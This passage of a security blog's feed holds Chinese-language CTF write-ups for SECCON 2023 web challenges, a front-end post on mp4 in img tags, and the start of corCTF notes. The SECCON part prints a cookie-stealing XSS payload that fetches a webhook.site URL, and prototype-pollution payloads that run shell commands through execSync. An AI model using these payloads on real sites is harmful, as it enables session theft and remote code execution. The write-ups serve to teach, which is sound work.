operator">+</span><span class="token string">"');setInterval(()=>&#123;location='/js/test'&#125;,2000)"</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload <span class="token operator">=</span> target<span class="token operator">+</span><span class="token string">"/js/..%2f?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="blink-14-solves">blink (14 solves)</span></h3><p>這題的核心程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">createBlink</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">html</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> sandbox <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#viewer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"iframe"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// I believe it is impossible to escape this iframe sandbox...</span>  sandbox<span class="token punctuation">.</span>sandbox <span class="token operator">=</span> sandboxAttribute<span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>width <span class="token operator">=</span> <span class="token string">"100%"</span><span class="token punctuation">;</span>  sandbox<span class="token punctuation">.</span>srcdoc <span class="token operator">=</span> html<span class="token punctuation">;</span>  <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>onload <span class="token operator">=</span> resolve<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> target <span class="token operator">=</span> <span class="token function">wrap</span><span class="token punctuation">(</span>sandbox<span class="token punctuation">.</span>contentDocument<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  target<span class="token punctuation">.</span>popover <span class="token operator">=</span> <span class="token string">"manual"</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span>togglePopover<span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token function">clearInterval</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>    sandbox<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>iframe 的地方沒辦法 bypass sandbox，但重點是 <code>setInterval(target.togglePopover, 400)</code> 這一行程式碼。</p><p>如果 <code>target.togglePopover</code> 是字串的話，就可以拿來當成 eval 用。</p><p>而 <code>target</code> 是 <code>sandbox.contentDocument.body</code>，可以用 <code>name</code> 去 DOM clobber <code>document.body</code>，接著再去 clobber <code>togglePopover</code> 就搞定了。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>body</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a id=togglePopover href=a:fetch(`http://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q=$&#123;document.cookie&#125;`)>&lt;/a><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3><span id="eeeeejs-12-solves">eeeeejs (12 solves)</span></h3><p>遺憾的一題，試了很久但沒有解開 QQ</p><p>這題的核心程式碼如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> ejs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"ejs"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename<span class="token punctuation">,</span> <span class="token operator">...</span>query <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>console<span class="token punctuation">.</span>log<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>你可以控制 <code>filename</code> 跟 <code>query</code>，目標是 XSS。</p><p>而 CSP 是 self，意思就是只要做出 <code>&lt;script src=/&gt;</code> 跟建構出一個合法的 JS 程式碼就可以拿到 flag 了。</p><p>但這邊另一個限制是只能讀取 <code>src</code> 底下的檔案，所以你的 template 是有限的。</p><p>而解法是利用 EJS 的 options <code>openDelimiter</code>、<code>closeDelimiter</code> 以及 <code>delimiter</code>，讓 EJS 用不同的方式去解析模板。</p><p>因為在 EJS 裏面 <code>&lt;%=</code> 可以輸出後面接的內容，而 <code>&lt;%-</code> 則是可以輸出 unescaped 的內容，所以我一開始的想法是找到符合這種 pattern 的字串，到最後只找到了一半，可以做出 <code>&lt;script&gt;</code> 但是屬性內容會被編碼，也找到了合法的 JavaScript 產生方式，總之最後沒做出來。</p><p>賽後看了一下其他人的解法，才意識到我忘記了這題是呼叫 node.js 以後輸出，作者的解法是把 debug 設成 true，就可以讓 EJS 輸出 src，而 src 會包含 filename，再利用 filename 可以是一個 object 的特性來傳入任意內容。</p><p>或是也可以直接把 <code>console.log(src)</code> 放到 template 裡面去。</p><p>舉例來說，有一段文字如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>debug<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>opts<span class="token punctuation">.</span>compileDebug <span class="token operator">&amp;&amp;</span> opts<span class="token punctuation">.</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>當我們這樣做以後：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">ejs<span class="token punctuation">.</span><span class="token function">renderFile</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token string-property property">'src'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">helllo</span><span class="token operator">:</span> <span class="token string">'world'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">settings</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string-property property">'view options'</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">delimiter</span><span class="token operator">:</span> <span class="token string">' '</span><span class="token punctuation">,</span>      <span class="token literal-property property">openDelimiter</span><span class="token operator">:</span> <span class="token string">'if (opts.debug)'</span><span class="token punctuation">,</span>      <span class="token literal-property property">closeDelimiter</span><span class="token operator">:</span> <span class="token string">" if (opts.compileDebug &amp;&amp; opts.filename)"</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>輸出會是：</p><pre class="line-numbers language-none"><code class="language-none">&#123; helllo: &#39;world&#39; &#125;   &#123;    src &#x3D; src + &quot;\n&#x2F;&#x2F;# sourceURL&#x3D;&quot; + sanitizedFilename + &quot;\n&quot;;  &#125;  &#x2F;&#x2F; other codes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之所以會這樣，是因為把 delimiter 改掉以後，上面那段文字就等同於是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token operator">%</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    src <span class="token operator">=</span> src <span class="token operator">+</span> <span class="token string">"\n//# sourceURL="</span> <span class="token operator">+</span> sanitizedFilename <span class="token operator">+</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// other codes</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此就等同於是執行了 <code>console.log(src)</code>，所以 src 就會出現在輸出裡面。</p><h3><span id="node-ppjail-5-solves">node-ppjail (5 solves)</span></h3><p>這題可以讓你污染 prototype 上面的東西，而且值可以是 function，但問題是不能污染已經有的屬性。</p><p>解法是觸發錯誤之後，去找 Node.js 底層會幹嘛，然後污染相對應的屬性。</p><p>一個簡單的範例是：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'pwn'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>Object<span class="token punctuation">.</span>toString<span class="token punctuation">.</span>arguments<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>輸出為：</p><pre class="line-numbers language-none"><code class="language-none">pwn&#x2F;js&#x2F;pp.js:4Object.toString.arguments                ^[TypeError: &#39;caller&#39;, &#39;callee&#39;, and &#39;arguments&#39; properties may not be accessed on strict mode functions or the arguments objects for calls to them]Node.js v20.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至於要怎麼找出這屬性，學 <a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#sandbox">maple</a> 去 patch V8 似乎是個不錯的選擇。</p><p>而作者則是有找到另外兩種方法，在這邊留個紀錄以後比較好找，來源是<a href="https://blog.arkark.dev/2023/09/21/seccon-quals/">作者的 writeup</a>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">solve1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 1:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/fixed_queue.js#L81</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/process/task_queues.js#L77</span>            <span class="token string">"1"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"callback"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">solve2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token comment"># Solution 2:</span>    <span class="token keyword">return</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token string">"__proto__"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token comment"># ref. https://github.com/nodejs/node/blob/v20.6.0/lib/internal/util/inspect.js#L1064</span>            <span class="token string">"circular"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                <span class="token string">"get"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>                    <span class="token string">"__custom__"</span><span class="token punctuation">:</span> <span class="token boolean">True</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"Function"</span><span class="token punctuation">,</span>                    <span class="token string">"args"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>                        <span class="token string-interpolation"><span class="token string">f"console.log(global.process.mainModule.require('child_process').execSync('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').toString())"</span></span>                    <span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token comment"># ref. https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Error/cause</span>            <span class="token string">"cause"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token comment"># Cause an error</span>        <span class="token string">"toString"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span>            <span class="token string">"caller"</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="deno-ppjail-2-solves">deno-ppjail (2 solves)</span></h3><p>跟上一題類似，但是是要找 deno 的 gadget。</p><p>作者找到的 gadget 是 <code>Object.prototype.return</code></p><p>而 maple 找到的是 cause + circular.get，@parrot409 找到的是 <code>nodeProcessUnhandledRejectionCallback</code></p><p>更詳細的說明可以參考 maple 的 writeup：<a href="https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail">https://blog.maple3142.net/2023/09/17/seccon-ctf-2023-quals-writeups/#deno-ppjail</a></p><h3><span id="hidden-note-1-solve">hidden-note (1 solve)</span></h3><p>這題也很有趣，題目就是經典的那種 XS leaks 的類型，有搜尋功能，只是搜尋結果會把 flag 給 filter 掉。</p><p>搜尋結果的頁面可以用 meta redirect 洩漏出來，所以是可以看到結果頁面的。只是結果頁面已經把 flag 去掉了，那還可以做些什麼呢？</p><p>在搜尋的時候，會把結果先排序，排序完以後再把 flag 去掉，而這一題所使用的排序方法在元素 &lt;&#x3D; 12 個的時候會是 stable sort，&gt;12 個就是 unstable sort。</p><p>因此，我們可以先建立恰好 12 個 note，內容為：<code>ECCON&#123;@|ECCON&#123;a|ECCON&#123;b|...</code></p><p>假如 flag 是 <code>SECCON&#123;abc&#125;</code> 好了，在搜尋 <code>ECCON&#123;@</code> 時，因為總數是 12 個，所以是 stable sort，最後搜尋結果頁面的 id 順序不會變。</p><p>但如果是搜尋 <code>ECCON&#123;a</code>，結果就變成 13 個，此時變成 unstable sort，note 的順序變了。</p><p>因此，可以從結果頁面的內容知道原始搜尋的結果是 12 個以內還是超過 12 個，就可以把這個當作 oracle，進而 leak 出 flag。</p><p>這個解法真的很酷，非常新穎！無論是出題的 Ark 還是解開的 maple，都真的好強</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。&lt;/p&gt;
&lt;p&gt;關鍵字列表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;nim json, null byte&lt;/li&gt;
&lt;li&gt;nim request smuggling&lt;/li&gt;
&lt;li&gt;js-yaml&lt;/li&gt;
&lt;li&gt;web worker&lt;/li&gt;
&lt;li&gt;blob URL&lt;/li&gt;
&lt;li&gt;meta redirect&lt;/li&gt;
&lt;li&gt;file protocol &amp;amp; .localhost domain&lt;/li&gt;
&lt;li&gt;sxg: Signed Exchanges&lt;/li&gt;
&lt;li&gt;431 CSP bypass&lt;/li&gt;
&lt;li&gt;DOM clobbering document.body&lt;/li&gt;
&lt;li&gt;ejs delimiter&lt;/li&gt;
&lt;li&gt;Node.js + Deno prototye pollution gadget&lt;/li&gt;
&lt;li&gt;XSleaks golang sort&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>原來 img src 也支援 mp4（Safari 限定）</title>
    <link href="https://blog.huli.tw/2023/09/11/mp4-in-img-src/"/>
    <id>https://blog.huli.tw/2023/09/11/mp4-in-img-src/</id>
    <published>2023-09-11T13:10:00.000Z</published>
    <updated>2023-09-11T13:29:47.865Z</updated>
    
    <content type="html"><![CDATA[<p>有些網站會用 GIF 來做一些圖檔，畢竟會動嘛，看起來就比一些靜態的圖片還要厲害，還要來得更吸引人。或其實不只是因為吸引人，而是有些需求本來就需要一個會動的圖，例如說貼圖，會動是很正常的。</p><p>但是 GIF 的缺點之一眾所皆知，就是檔案很大，真的很大。尤其是手機上因為解析度比較高，可能會需要用到三倍大小的圖片，就算只顯示 52 px，也要準備 156px 的圖檔，佔的空間就更多了。以網頁來說，當然是要載入的資源越少越好，越小也越好。</p><span id="more"></span><p>因此，很多網站會改用 <code>&lt;video&gt;</code> 標籤來呈現這些動圖，只要先轉成 mp4 格式，檔案大小就能小很多。不過轉成 <code>&lt;video&gt;</code> 的問題大概就是原先用 <code>&lt;img&gt;</code> 的一些好處會不見，像是 lazy loading 似乎就沒有原生支援，有一些麻煩。</p><p>而我在查資料的過程中，居然意外發現在 Safari 上面，<code>&lt;img&gt;</code> 是支援 mp4 的！也就是說，你可以這樣做：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>而且這個功能推出很久了，從 2017 的時候就有了：<a href="https://bugs.webkit.org/show_bug.cgi?id=176825">Bug 176825 - [Cocoa] Add an ImageDecoder subclass backed by AVFoundation</a></p><p>我是從這篇文章知道的：<a href="https://calendar.perfplanet.com/2017/animated-gif-without-the-gif/">Evolution of &lt;img&gt;: Gif without the GIF</a></p><p>如果 <code>&lt;img&gt;</code> 裡面也可以放 mp4 的話，就可以同時利用到兩者的優點，又不用換標籤，又支援 lazy loading，然後檔案大小又一下縮減了許多。</p><p>但可惜的事情是，只有 Safari 有支援而已，就算過了六年，在 Chromium 以及 Firefox 上都沒看到這個功能，而且未來也沒什麼機會看到了。</p><p>之所以會這樣講，是因為 Chromium 已經明確表示不會支援，討論串在這邊：<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=791658">Issue 791658: Support &lt;img src&#x3D;”*.mp4”&gt;</a> ，在 2018 的時候就已經被標記為 Wont fix，理由如下：</p><pre class="line-numbers language-none"><code class="language-none">Closing as WontFix per c#35, due to the following:- The widespread adoption of WebP (addresses CDN use case)- Forthcoming AV1 based image formats (ditto).- Memory inefficiency with allowing arbitrary video in image.- Most sites have already switched to &lt;video muted&gt; now that autoplay is allowed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一點提到的是 WebP 其實也有個 Animated WebP 的格式，可以放在 <code>&lt;img src&gt;</code> 裡面而且也會動，檔案大小更小，其他優缺點可以參考 Google 自己寫的：<a href="https://developers.google.com/speed/webp/faq?hl=zh-tw#why_should_i_use_animated_webp">使用 WebP 動畫有什麼好處？</a></p><p>而第二點是在說比較新的圖片格式 AVIF 也有 Animated AVIF，同樣也支援動圖。</p><p>如果這些新的圖片格式都可以取代 GIF 的話，好像確實沒什麼必要一定要使用 mp4？</p><p>而 Firefox 的話雖然沒有說不會做，但是 issue 也已經很久沒動了：<a href="https://bugzilla.mozilla.org/show_bug.cgi?id=895131">Add support for video formats in &lt;img&gt;, behaving like animated gif</a></p><p>也有人希望可以把這個功能加入規格，但也有一陣子沒有動靜：<a href="https://github.com/whatwg/html/issues/7141">Require img to be able to load the same video formats as video supports #7141</a></p><p>總而言之，看起來這個功能應該只會在 Safari 上面有了。</p><p>可惜我在用的 image service 的自動轉檔功能只支援 GIF 轉 mp4，不支援轉成 animated WebP 或是 animated AVIF，不然就超方便的。</p><h2><span id="總結">總結</span></h2><p>如果想要繼續用 <code>&lt;img&gt;</code> 來放動圖的話，最完整的方式應該是使用 <code>&lt;picture&gt;</code> 標籤搭配多種檔案格式，像這樣：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>picture</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/avif<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.avif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.mp4<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>image/webp<span class="token punctuation">"</span></span> <span class="token attr-name">srcset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.webp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.gif<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>picture</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這樣就可以確保在每個瀏覽器上面都可以呈現出結果，並且會選擇通常檔案大小較小的圖片。</p><p>我隨便試了一下，自己錄了一個簡單的 gif，原始大小是 75 KB：</p><p><img src="/img/mp4-in-img-src/test.gif" alt="gif"></p><p>轉成 WebP 之後是 58 KB (-22.6%)：</p><p><img src="/img/mp4-in-img-src/test.webp" alt="webp"></p><p>轉成 mp4 是 17 KB（-77.3%）：</p><p><img src="/img/mp4-in-img-src/test.mp4" alt="只有 Safari 支援 mp4，看不到正常"></p><p>轉成 AVIF 是 11 KB（-85.3%）：</p><p><img src="/img/mp4-in-img-src/test.avif" alt="AVIF 格式，有可能較新還不支援"></p><p>看來最新的檔案格式還是滿厲害的，一下就小了超多。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;有些網站會用 GIF 來做一些圖檔，畢竟會動嘛，看起來就比一些靜態的圖片還要厲害，還要來得更吸引人。或其實不只是因為吸引人，而是有些需求本來就需要一個會動的圖，例如說貼圖，會動是很正常的。&lt;/p&gt;
&lt;p&gt;但是 GIF 的缺點之一眾所皆知，就是檔案很大，真的很大。尤其是手機上因為解析度比較高，可能會需要用到三倍大小的圖片，就算只顯示 52 px，也要準備 156px 的圖檔，佔的空間就更多了。以網頁來說，當然是要載入的資源越少越好，越小也越好。&lt;/p&gt;</summary>
    
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/categories/Front-end/"/>
    
    
    <category term="Front-end" scheme="https://blog.huli.tw/tags/Front-end/"/>
    
  </entry>
  
  
  
  <entry>
    <title>corCTF 2023 &amp; Sekai CTF 2023 筆記</title>
    <link href="https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/02/corctf-sekaictf-2023-writeup/</id>
    <published>2023-09-02T06:10:44.000Z</published>
    <updated>2023-09-02T06:17:28.454Z</updated>
    
    <content type="html"><![CDATA[<p>這兩場都有稍微參加一下，但不是每一題都有看，這篇純粹做個筆記而已，稍微記一下解法，不會太詳細。</p><p>老樣子，筆記一下關鍵字：</p><ol><li>GraphQL batch query + alias</li><li>Python os.path.join 絕對路徑</li><li>Svg XSS, foreignObject</li><li>WebRTC CSP bypass</li><li>Status code xsleak</li><li>DNS rebinding</li><li>nmap command injection</li><li>ruby rack 上傳檔案暫存</li><li>buildConstraintViolationWithTemplate EL injection</li><li>request smuggling</li><li>document.baseURI</li><li>200&#x2F;404 status code xsleak</li></ol><span id="more"></span><h2><span id="corctf-2023">corCTF 2023</span></h2><p>題目的原始碼都在這邊：<a href="https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web">https://github.com/Crusaders-of-Rust/corCTF-2023-public-challenge-archive/tree/master/web</a><br>部分 web 題的 writeup：<a href="https://brycec.me/posts/corctf_2023_challenges">https://brycec.me/posts/corctf_2023_challenges</a></p><h3><span id="force-118-solves">force (118 solves)</span></h3><p>pin 碼的值有 10000 種可能，需要在 10 個 request 以內用 GraphQL query 找出正確的值。</p><p>解法就是用 batch query + alias，一個請求就可以試很多次（取自底下的文章）：</p><pre class="line-numbers language-none"><code class="language-none">&#123;  flag0:flag(pin:0),  flag1:flag(pin:1),  flag2:flag(pin:2),  flag3:flag(pin:3),  flag4:flag(pin:4),  flag5:flag(pin:5)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他人的 writeup：</p><ol><li><a href="https://siunam321.github.io/ctf/corCTF-2023/web/force/">https://siunam321.github.io/ctf/corCTF-2023/web/force/</a></li><li><a 